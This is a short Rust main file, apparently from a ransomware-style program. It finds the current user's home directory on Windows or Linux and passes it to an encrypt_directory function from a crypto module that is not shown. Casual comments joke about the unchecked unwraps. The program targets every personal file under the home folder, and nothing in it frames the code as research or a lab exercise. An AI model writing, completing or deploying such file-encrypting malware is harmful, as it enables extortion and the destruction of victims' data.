mod crypto;
use crypto::encrypt_directory;
use std::env;

fn main() {
    #[cfg(target_os = "windows")]
    let home: String = env::var("USERPROFILE").unwrap_or("C:\\Users\\Xory".to_string()); // no way this could fail!
    #[cfg(target_os = "linux")]
    let home: String = env::var("HOME").unwrap();
    encrypt_directory(&home).unwrap(); // I know this many unwraps look
                                                        // suspicious, but the chance of this
                                                        // failing is less than a solar flare.
}
